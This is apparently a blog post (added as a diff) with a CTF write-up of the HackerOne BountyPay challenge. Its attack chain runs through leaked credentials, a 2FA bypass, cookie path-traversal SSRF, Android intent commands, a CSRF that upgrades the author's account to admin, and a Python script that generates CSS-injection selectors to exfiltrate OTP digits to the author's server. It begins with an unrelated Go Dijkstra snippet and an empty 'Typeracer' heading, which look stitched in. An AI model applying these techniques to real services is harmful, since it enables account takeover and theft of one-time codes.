@@ -1,0 +1,423 @@
+---
+layout: post
+title: "H1-2006 2020 writeup"
+categories: ctf
+---
+
+## Introduction {#intro}
+
+{% highlight go %}
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"log"
+	"os"
+	"strconv"
+	"strings"
+
+	"github.com/RyanCarrier/dijkstra"
+)
+
+func main() {
+	// initialize the map and 200,000 numbered points
+	graph := dijkstra.NewGraph()
+
+	for i := 1; i < 200001; i++ {
+		graph.AddVertex(i)
+	}
+
+	// open file with path data
+	file, _ := os.Open("map.txt")
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		x := scanner.Text()
+		y := strings.Split(x, " ")
+		// convert strings to int
+		z1, _ := strconv.Atoi(y[0])
+		z2, _ := strconv.Atoi(y[1])
+		z3, _ := strconv.Atoi(y[2])
+		// routes needs to be added both ways
+		graph.AddArc(z1, z2, int64(z3))
+		graph.AddArc(z2, z1, int64(z3))
+	}
+
+	// find and print the best path
+	best, err := graph.Shortest(1, 200000)
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Println(best.Path)
+
+}
+
+{% endhighlight %}
+
+----------------
+
+## Typeracer {#typeracer}
+{: style="text-align: center"}
+####  Category: Web | Solves: 184 | Points: 119
+{: style="text-align: center"}
+
+----------------
+
+----------------
+
+{:refdef: style="text-align: center;"}
+[--- Back to Top ---](#intro)
+{: refdef}
+
+----------------
+
+
+{:refdef: style="text-align: center;"}
+{{ '/public/h1flag.png' | relative_url }}{: .imgCenter}
+{: refdef}
+
+Through multiple vulnerabilites in the web apps and the mobile app i was able to recover Marten's account and pay all the hackers!
+Thus completing the CTF.
+
+
+The first thing i did was check certificate transparency logs for certs issued to the domains in scope.
+This gave me:
+- software.bountypay.h1ctf.com
+- staff.bountypay.h1ctf.com
+- api.bountypay.h1ctf.com
+- app.bountypay.h1ctf.com
+- bountypay.h1ctf.com
+
+A quick look at all of them showed me that software.bountypay.h1ctf.com was only reachable by an internal IP (exploited later), app.bountypay.h1ctf.com and staff.bountypay.h1ctf.com had login pages, bountypay.h1ctf.com was a landing page with links to above mentioned login pages and last api.bountypay.h1ctf.com had a link on it's page which redirected to a google search https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API which will come in handy later.
+
+Not having too many options i decided to throw a small wordlist at the targets to see if there would be any quick hits, and there was one indeed!
+http://app.bountypay.h1ctf.com/.git/config
+This downloaded a git config file with the following contents:
+```
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote "origin"]
+	url = https://github.com/bounty-pay-code/request-logger.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "master"]
+	remote = origin
+	merge = refs/heads/master
+```
+Look at that, a git repo :) 
+
+Navigating to this repo shows us a single file called logger.php, with the following contents:
+{% highlight php %}
+<?php
+
+$data = array(
+  'IP'        =>  $_SERVER["REMOTE_ADDR"],
+  'URI'       =>  $_SERVER["REQUEST_URI"],
+  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
+  'PARAMS'    =>  array(
+      'GET'   =>  $_GET,
+      'POST'  =>  $_POST
+  )
+);
+
+file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
+{% endhighlight %}
+
+As we can see it logs HTTP requests to a file called 'bp_web_trace.log', so let's see if we can find that on the server.
+We can!
+It downloads the logfile:
+```
+1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
+1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
+1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
+1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
+```
+Base64 encoded data, let us decode that real quick.
+```
+1588931909:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
+1588931919:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
+1588931928:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
+1588931945:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
+```
+Credentials!
+Trying those credentials on app.bountypay.h1ctf.com lets us log right in, but we are greeted by a required 2fa step.
+We see "challenge_answer" in the leaked logs trying that value sadly fails.
+After trying to bypass the 2fa in a few different ways i decided to take the "challenge_answer"  value and generate all hashes on cyberchef for it, as i saw the POST request sends a parameter called "challenge".
+So I tried to replace the "challenge" value with each generated hash one by one, keeping "challenge_answer" the same.
+MD5 worked!
+We are in Brian's account.
+
+The dashboard only has a single functionality, Load Transactions.
+Trying the date we got from the logfile comes up empty, so do all other date we can chose.
+I investigated the request it sends in burp and saw that it displays the full API request it sends to the api sever internally.
+The cookie that was set on login is just base64 encoded json, upon decoding i saw that it was comprised of an account_id and a hash.
+The account_id was reflected in the response, so i added a "#" to the end of the account_id to check if it would cut of the internal request URL.
+To my surprise, it did. This displayed us with some more information on Brian, namely his full name and the company he is registered for.
+At this point i spent quite a while trying random things like bruteforcing paths via editing the cookie,  without any interesting results.
+Then i remembered the redirect to a google search we saw from earlier, both the internal request and the redirect were hitting api.bountypay.h1ctf.com
+So i edited to cookie's account_id to traverse back to the root of the api request and appended "redirect?url=https://www.google.com/search?q=REST+API" like so 
+{% highlight javascript %}
+{"account_id":"F8gHiqSdpK/../../../../../redirect?url=https://www.google.com/search?q=REST+API","hash":"de235bffd23df6995ad4e0930baac1a2"}
+{% endhighlight %}
+Response: 200 OK
+Interesting.
+I tried replacing google.com with a random website to see if there was an open redirect present.
+"URL NOT FOUND IN WHITELIST" :(
+But i didn't give up and tried to bypass the filter, which didn't work :(
+
+I remembered that there was software.bountypay.h1ctf.com which required an internal IP address, so i replaced the url with http://software.bountypay.h1ctf.com... and "URL NOT FOUND IN WHITELIST".
+This sent me down a few rabbit holes, a few too many rabbit holes...
+After a while i came back to the request and tried the same url again, this time with https://..... it worked -.-
+We got a 404 not found.
+So i went ahead and started bruteforcing paths using intruder with a wordlist and base64 encoding the cookie before sending it off making sure i ended our path with "#" to cancel  out the rest of the internal request.
+
+We got a 200 OK on /uploads showing us a file called BountyPay.apk
+Let's download it!
+
+After unzipping and decompiling the app i went straight into the code to see what the app was about.
+I quickly found PartOne-, PartTwo- and PartThreeActivity, so i started with PartOne.
+
+Reading the code was pretty straight forward, I saw that it was getting an intent with 1 parameter called "start" with value "PartTwoActivity".
+Looking at the manifest showed me the schema and host i had to use to call the intent, so i fired up genymotion and loaded up the app.
+
+It required us to enter a name and an optional twitter handle, so i did and it opened the first activity.
+
+using adb i sent the command 
+```
+\adb.exe shell am start -a "android.intent.action.VIEW" -d "one://part?start=PartTwoActivity"
+```
+Which opened up the second activity. Progress!
+
+Again, looking at the code I saw it was getting an intent this time with 2 query parameters "two" and "switch" with values "light" and "on".
+Sending the second command
+
+```
+\adb.exe shell am start -a "android.intent.action.VIEW" -d "two://part?two=light\&switch=on"
+```
+
+This revealed a textbox on the screen that was invisible before.
+It requested us entering a value starting with "X-"
+Reading the code i found out that it was looking for a "dataSnapshot" value which turned out to be firebase related.
+Not having any idea how to get that value without modifying the app and printing it out i decided to just search all of the code for "X-"
+which turned up a few results, the most interesting one was "X-Token".
+I tried inputting "X-Token" and it opened the third activity.
+
+The code for this activity was much bigger,  it made a post request to a host with token, logging stuff here and there.
+And it was looking for some parameters yet again, this time base64 encoded.
+So we send the third command
+```
+.\adb.exe shell am start -a "android.intent.action.VIEW" -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"
+```
+This revealed yet another textbox this time asking for a leaked hash.
+Looking at the code again i noticed that "SharedPreferences" related things were being called in all the activities.
+ A quick google told me that this is an easy way to store key-value pairs directly on the phone in data/data/{appname}
+After checking out that location on the filesystem and navigating to /shared_prefs inside that folder I saw that there was a file called
+"user_created.xml"
+Looking at the contents
+{:refdef: style="text-align: center;"}
+{{ '/public/leak.png' | relative_url }}{: .imgCenter}
+{: refdef}
+Could this be the hash it is looking for?
+{:refdef: style="text-align: center;"}
+{{ '/public/android.png' | relative_url }}{: .imgCenter}
+{: refdef}
+Yes!
+
+Seeing the "HOST" value being http://api.bountypay.h1ctf.com i remembered that during my initial recon i found an endpoint on there /api/staff.
+It replied with "["Missing or invalid Token"]".
+Could this be our missing token?
+
+In burp i tried setting it as a cookie first with no success, as a header like the following "token: value" also with no success.
+I decided to try the same format as inside the app "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
+And it worked.
+It replied with 
+{% highlight javascript %}
+[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
+{% endhighlight %}
+Staff accounts, interesting. But i didnt really have a use for this... yet.
+After jumping into many rabbit holes yet again i decided to try simply changing the request to /api/staff to a POST request.
+400 Bad Request:
+["Missing Parameter"]
+
+Could this mean that a POST request created staff accounts?
+i decided to add "staff_id=STF:84DJKEIP38" as a POST parameter to see what would happen.
+
+{% highlight javascript %}
+["Staff Member already has an account"]
+{% endhighlight %}
+Trying the other ID as well with the same response I was back to following rabbit holes.
+I saw that Hacker0x01 retweeted an account called BountyPayHQ.
+I investigated and noticed a  tweet reading the following:
+```
+Today we welcome Sandra to the team!!!
+```
+Who is sandra?
+Checking the people who BountyPayHQ follows revealed Sandra!
+She tweeted a picture of her badge (never do this)
+https://pbs.twimg.com/media/EXfGdchWoAAtVO0?format=jpg&name=4096x4096
+Another staff_id to try.
+
+{% highlight javascript %}
+{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
+{% endhighlight %}
+
+Aaaand we have a staff account, sweet.
+Looking around we see a ticket from an admin, the ability to change our profile name and picture as well as the ability to report a url to the admins. With the exception being /admin urls which will become important in a bit.
+The html for the ticket tab referenced a javascript file called 
+
+It was relatively smalle so i quickly went through the code to determine what it does.
+{% highlight javascript %}
+$(".upgradeToAdmin").click(function () {
+    let t = $('input[name="username"]').val();
+    $.get("/admin/upgrade?username=" + t, function () {
+        alert("User Upgraded to Admin")
+    })
+{% endhighlight %}
+Sends a request to an endpoint upgrading an account to admin. Juicy. Hitting it we get denied telling us we are missing the permissions.
+{% highlight javascript %}
+$(".tab").click(function () {
+    return $(".tab").removeClass("active"),
+    $(this).addClass("active"),
+    $("div.content").addClass("hidden"),
+    $("div.content-" + $(this).attr("data-target")).removeClass("hidden"),
+    !1
+})
+{% endhighlight %}
+Some UI stuff.
+{% highlight javascript %}
+$(".sendReport").click(function () {
+    $.get("/admin/report?url=" + url, function () {
+        alert("Report sent to admin team")
+    })
+{% endhighlight %}
+sending the report I mentioned earlier.
+{% highlight javascript %}
+document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
+{% endhighlight %}
+This check if a url fragment is present and then calls the "click" event on elements with the class of tab1-4. Hmm.
+
+If we can somehow control the "class" attribute of an element,  we can then "click" on that element by appending #tab1-4 to the end of the URL.
+Since the "upgradeToAdmin" function looks for "class" attribute named "upgradeToAdmin" as well, we could chain these two things together to make someone instantly call the "upgradeToAdmin" function.
+This would effectively allow us to send a url to an admin who instantly calls the "upgradeToAdmin" function upon visiting the link.
+Playing around with the edit profile functionality i noticed that we can change the name of the picture to anything we want, which will also be reflected inside a "class" attribute on the ticket endpoint. Another puzzle piece for our exploit chain.
+Changing the profile picture name to "tab1+upgradeToAdmin" inside the request is our first step to the chain.
+
+Testing what we have so far on the ticket endpoint /?template=ticket&ticket_id=3582#tab1
+We can see that it sends the request upon visiting, with one problem still remaining.
+The jquery function looks for an input element with name "username" which is not on the ticket page, thus setting the username to upgrade to "undefined".
+I found an input element with name "username" after a quick search, it was the login page.
+It struck me as odd that all pages were loaded as templates instead of normal endpoints, like on all the other pages.
+I had the crazy idea that if i was able to load 2 templates at once, i could load the ticket and login template thus having almost all i need to complete the chain.
+
+I tried many things like template=1,2 or template=1&template=2 and so on.
+I remembered that you can turn query parameters into arrays like so "template[]=", so i tried "template[]=1,2" didn't work.
+Then i tried "template[]=login&template[]=ticket", it worked! i couldnt believe.
+The last puzzle piece was prepopulating the username input field with our desired name which was "sandra.allison".
+Luckily adding the query parameter "username=sandra.allison" did just that.
+Exploit chain complete.
+After a successful dry run i base64 encoded the path, appended it to the report request
+```
+/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=
+```
+and send it off.
+
+-----------------------
+
+A short wait later i refreshed the page and was greeted with a new tab in my menu called admin.
+
+{:refdef: style="text-align: center;"}
+{{ '/public/marten1.png' | relative_url }}{: .imgCenter}
+{: refdef}
+
+Another set of credentials, the only other active once besides Brian's which we already knew.
+
+Logging in with the credentials on app.bountypay.h1ctf.com yet again showed us the 2fa prompt.
+Remembering the MD5 encoded 10 char value from last time i wondered if we could just reuse it, since we didnt have a valid code for marten.
+It works, the server just checks if the 10 char value == the MD5 hash of it.
+Inside Martens account we again have the Load Transactions feature, but this time with a single entry for 05/2020.
+ So close to our goal of paying out the bounties!
+Hitting pay we are redirected to the payment page with yet another 2fa step, but this time our MD5 trick doesnt help.
+We have 2 minutes to obtain a valid OTP code to send the payment.
+Looking at the request of the original page load i noticed it sending a url to a .css file in the post parameters.
+"uni_2fa_style.css"
+Is this actually CSS for the 2fa app?
+Could this be a case of CSS injection?
+I changed the URL to one i control with simple css file containing an image url to a server i control.
+Repeating the request, waiting a second, we got a hit!
+
+Time to find out what element our potential code is in.
+i quickly found an input element with a name starting with "c"
+so i tried input[name^='code'] and got another hit.
+Now i decided to write a quick python script to automatically generate the css for me to speed things up.
+It found that there are 7 input fields with names code_1 - code_7.
+
+This was the code i ended up with
+
+-----------------------
+
+-----------------------
+
+{% highlight python %}
+
+import sys
+
+keyspace = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/*-+\{\}[]\!\\\"£$%^&*()_="
+
+css1 = """
+input[name^='code_1'][value^='%s'] {
+    background-image: url('http://myurl/1%s');
+}
+"""
+css2 = """
+input[name^='code_2'][value^='%s'] {
+    background-image: url('http://myurl/2%s');
+}
+"""
+css3 = """
+input[name^='code_3'][value^='%s'] {
+    background-image: url('http://myurl/3%s');
+}
+"""
+css4 = """
+input[name^='code_4'][value^='%s'] {
+    background-image: url('http://myurl/4%s');
+}
+"""
+css5 = """
+input[name^='code_5'][value^='%s'] {
+    background-image: url('http://myurl/5%s');
+}
+"""
+css6 = """
+input[name^='code_6'][value^='%s'] {
+    background-image: url('http://myurl/6%s');
+}
+"""
+css7 = """
+input[name^='code_7'][value^='%s'] {
+    background-image: url('http://myurl/7%s');
+}
+"""
+
+
+for letter in keyspace:
+    print(css1 % (letter,letter))
+    print(css2 % (letter,letter))
+    print(css3 % (letter,letter))
+    print(css4 % (letter,letter))
+    print(css5 % (letter,letter))
+    print(css6 % (letter,letter))
+    print(css7 % (letter,letter))
+
+{% endhighlight %}
+
+-----------------------
+
+Requesting the payments page again, intercepting the request, loading the css file via the request, waiting for the responses, extracting the leaked letters and?
+SUCCESS!
+
+## All bounties have been paid!
+
+-----------------------
